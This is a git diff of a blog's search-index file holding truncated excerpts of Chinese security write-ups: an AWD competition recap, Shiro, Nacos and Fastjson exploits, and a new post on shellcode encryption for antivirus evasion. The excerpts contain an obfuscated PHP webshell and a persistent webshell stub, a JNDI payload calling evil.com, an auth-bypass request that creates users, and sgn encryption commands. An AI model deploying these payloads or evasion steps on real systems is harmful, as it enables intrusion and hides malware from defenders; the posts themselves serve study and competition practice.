@@ -54,9 +54,9 @@ var store = [{
         "teaser": null
       },{
         "title": "写下服务器的笔记",
-        "excerpt":"写下服务器的笔记 前言 最近买了一年的国内某云的服务器。这篇文章主要记录一下我在这台服务器上做的事情，避免以后采坑。操作系统是Ubuntu18.04，持续更新。 换源 备份源文件 $ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 更改文件权限使其可编辑 $ sudo chmod 777 /etc/apt/sources.list Ubuntu 18.04 阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports...","categories": ["tricks"],
+        "excerpt":"写下服务器的笔记 前言 最近买了一年的国内某云的服务器。这篇文章主要记录一下我在这台服务器上做的事情，避免以后采坑。操作系统是Ubuntu18.04，持续更新。 换源 备份源文件 $ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 更改文件权限使其可编辑 $ sudo chmod 777 /etc/apt/sources.list Ubuntu 18.04 阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports...","categories": ["linux"],
         "tags": ["linux"],
-        "url": "/tricks/server/",
+        "url": "/linux/server/",
         "teaser": null
       },{
         "title": "Linux - Crontab",
@@ -66,9 +66,9 @@ var store = [{
         "teaser": null
       },{
         "title": "2020河北省赛线下经验总结",
-        "excerpt":"0x00 写在前面 这是在比赛开始之前，分工后自己简单写的一个比赛思路。 1. 修改ssh {passwd} &amp;&amp; 修改mysql{set password = password('password');} 2. 备份源码 3. 扫描源码 4. 简单审计 上waf 删除一句话 删站观察是否check 5. 利用一句话去打别人 流量混淆 webshell混淆 权限维持 6. （主机发现） 7. 提权 办ip 修改php.ini禁用危险函数 8. 目录扫描 漏洞挖掘 0x01 开干 SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。 很快找到了一个文件上传漏洞，很快上传了一个webshell，密码是yueyejian &lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(39).$_uU(121).$_uU(117).$_uU(101).$_uU(121).$_uU(101).$_uU(106).$_uU(105).$_uU(97).$_uU(110).$_uU(39).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?&gt; 然后再网站主页上传了内存木马俗称不死马，会自动生成上面内容的webshell &lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'webshell.php'; $code...","categories": ["tricks"],
-        "tags": ["awd"],
-        "url": "/tricks/awd/",
+        "excerpt":"0x00 写在前面 这是在比赛开始之前，分工后自己简单写的一个比赛思路。 1. 修改ssh {passwd} &amp;&amp; 修改mysql{set password = password('password');} 2. 备份源码 3. 扫描源码 4. 简单审计 上waf 删除一句话 删站观察是否check 5. 利用一句话去打别人 流量混淆 webshell混淆 权限维持 6. （主机发现） 7. 提权 办ip 修改php.ini禁用危险函数 8. 目录扫描 漏洞挖掘 0x01 开干 SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。 很快找到了一个文件上传漏洞，很快上传了一个webshell，密码是yueyejian &lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(39).$_uU(121).$_uU(117).$_uU(101).$_uU(121).$_uU(101).$_uU(106).$_uU(105).$_uU(97).$_uU(110).$_uU(39).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?&gt; 然后再网站主页上传了内存木马俗称不死马，会自动生成上面内容的webshell &lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'webshell.php'; $code...","categories": ["linux"],
+        "tags": ["awd","php","linux","ctf"],
+        "url": "/linux/awd/",
         "teaser": null
       },{
         "title": "LFI - 可利用敏感文件",
@@ -84,7 +84,7 @@ var store = [{
         "teaser": null
       },{
         "title": "CVE-2016-4437 - Shiro反序列化",
-        "excerpt":"CVE-2016-4437 - Shiro反序列化  0x00 漏洞概述  Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。   0x01 影响范围   Apache Shiro &lt;=1.2.4   0x02 环境搭建  使用vulhub搭建环境  $ docker-compose up -d     0x03 漏洞原理  Shiro的身份认证工作流程：   通过前端传入的值–&gt;获取remenberMe cookie–&gt;base64加密–&gt;AES加密–&gt;反序列化   以上流程中AES加密的密钥存在padding oracle攻击及密钥泄露。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞   0x04 漏洞检测   尝试登录，登录的返回包中有rememberMe=deleteMe字段      或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在rememberMe=deleteMe字段      则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞   https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51      当命令框可输入，代表存在漏洞      可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell      ","categories": ["exploit"],
+        "excerpt":"CVE-2016-4437 - Shiro反序列化  0x00 漏洞概述  Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。   0x01 影响范围   Apache Shiro &lt;=1.2.4   0x02 环境搭建  使用vulhub搭建环境  $ docker-compose up -d     0x03 漏洞原理  Shrio550   shrio550如果打开源码来进行审计的话，源码当中将AES加密的秘钥固定在源码当中，如果程序员没有去更改他或者程序员使用一些常用的秘钥的话，攻击者可以通过固定秘钥或者枚举秘钥的方式，然后就可以完成cookie当中的这个字段的破解   用户在使用正确的账号密码登录，服务器认证通过之后，会经过序列化–&gt;AES加密–&gt;base64编码，最后得到一个cookie信息一般是rememberMe字段，然后一cookie的方式返回  到客户端，客户端就把这个cookie信息存下来，在下一次用户浏览器关闭后在登录到这个站点后，通过cookie当中的rememberMe信息，又传到服务器，服务器就是用反过的方式，首先先进性base64编码–&gt;AES解密–&gt;反序列化   shrio721   shrio的721的区别跟shrio550的区别在于加密算法，shrio721使用的是AES128-CBC的一个分组，AES128-CBC是什么意思呢，AES是对称加密的算法128是表示一个分组的长度以128个字节为一组，CBC是分组秘钥连接模式，他的一个过程是这样子的，首先会将我们的加密明文案进行分组，以128位进行分组，这时候就一定有一组是不足128位的，这时候就使用了一个pkcs5填充方式，后面缺少多少位就填充多少位，在这时候就可能受到一个oracle的填充攻击，能在不知道 秘钥的情况下能够去破解出他的明文，第二点可以通过字节翻转的攻击在不知道秘钥的时候可以进行字符串的更改，所以就可以通过oracle填充攻击，去破解AES128-CBC的加密方式，然后就可以将恶意的cookie信息和之前的cookie信息拼接到一起构造恶意的payload，前提条件就是需要获取一次合法用户的cookie信息且服务器含有可以利用的攻击链   0x04 漏洞检测   尝试登录，登录的返回包中有rememberMe=deleteMe字段      或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在rememberMe=deleteMe字段      则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞   https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51      当命令框可输入，代表存在漏洞      可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell      ","categories": ["exploit"],
         "tags": ["shiro","unserialize","web","rce"],
         "url": "/exploit/CVE-2016-4437/",
         "teaser": null
@@ -168,7 +168,7 @@ var store = [{
         "teaser": null
       },{
         "title": "CVE-2021-29441 - Nacos身份认证绕过漏洞",
-        "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["exploit"],
+        "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台      ","categories": ["exploit"],
         "tags": ["nacos","nday","web","unserialize"],
         "url": "/exploit/nacos/",
         "teaser": null
@@ -183,5 +183,11 @@ var store = [{
         "excerpt":"Fastjson-1.2.24-RCE 0x00 漏洞概述 fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是jndi注入。很快阿里发布了新的版本1.2.25，通过checkAutoType()这个函数来防御这个漏洞。 后来针对checkAutoType()这个函数，出现了一系列的绕过手段以及修复补丁。 0x01 漏洞原理 fastjson RCE关键函数 DefaultJSONParser. parseObject() #解析传入的 json 字符串提取不同的 key 进行后续的处理。 TypeUtils. loadClass() #根据传入的类名，生成类的实例。 JavaBeanDeserializer. Deserialze() #依次调用 @type 中传入类的对象公有 set\\get\\is 方法。 ParserConfig. checkAutoType() #阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。 Payload { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://evil.com:9999/\", \"autoCommit\":true } } 该Payload有效的原理是：fastjson 在处理以@type形式传入的类的时候，会默认调用该类的共有 set\\get\\is 函数，因此我们在寻找利用类的时候思路如下： 1、类的成员变量我们可以控制； 2、想办法在调用类的某个set\\get\\is函数的时候造成命令执行。 于是便找到了 JdbcRowSetImpl 类，该类在 setAutoCommit 函数中会对成员变量...","categories": ["exploit"],
         "tags": ["fastjson","web","java"],
         "url": "/exploit/fastjson/",
+        "teaser": null
+      },{
+        "title": "Shellcode加密",
+        "excerpt":"Shellcode加密 0x00 写在前面 今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。 不多bb了，关于免杀，网络上的教程还是比较多的，也是我比较感兴趣的内容，我目前的学习路线是： 1. 免杀知识（Shellcode加密、减少熵、反沙箱、导入表隐藏、etw和amsi修补、系统调用、unhook、白加黑、opsec杀人于无形、c2选择等） 2. 把网络知识补上（Wireshark分析等） 3. 进源渗透的一些思路 4. 工具开发（Golang、Cobaltstrike插件开发等） 5. 内网该会的都得会 0x01 Shellcode生成 Shellcode是一段用于利用软件漏洞而执行的代码，Shellcode为16进制之机械码，以其经常让攻击者获得Shell而得名。用Cobaltstrike &gt; Payloads &gt; 可以分别生成有阶段和无阶段的Payload，输出格式选择Raw（原始二进制数据），即可生成一段我们所需要的Shellcode。那么Shellcode到底是二进制还是十六进制呢？本质上是二进制数据，十六进制只不过是二进制的另一种可视化形式。 Stager和Stageless的区别是C4和导弹的区别，Stager小巧但容易被发现，Stageless可瞬爆但体积过大不利于传输 0x02 Shellcode加密 Shellcode加密一般用sgn加密，Shikata ga nai日语是没有办法。需要先安装 keystone engine来作为依赖，可以用docker容器的方式直接跳过依赖库的安装。sgn加密后的Shellcode无需解密，可直接写入内存并执行，并且可以规避一切杀软的检测，这两个优点使sgn加密成为Shellcode加密最好的办法。也可以自己写脚本对Shellcode进行异或、求反、反转等一系列运算后再解密，达到了一定的混淆程度之后同样可以规避杀软。 docker pull egee/sgn docker run -it -v /tmp/:/tmp/ egee/sgn -a 64 /tmp/shellcode 用以下小工具可以轻松提取shellcode的16进制数组： package main //sctool by yueyejian import (...","categories": ["antivirus-evasion"],
+        "tags": ["golang"],
+        "url": "/antivirus-evasion/shellcode/",
         "teaser": null
       }]
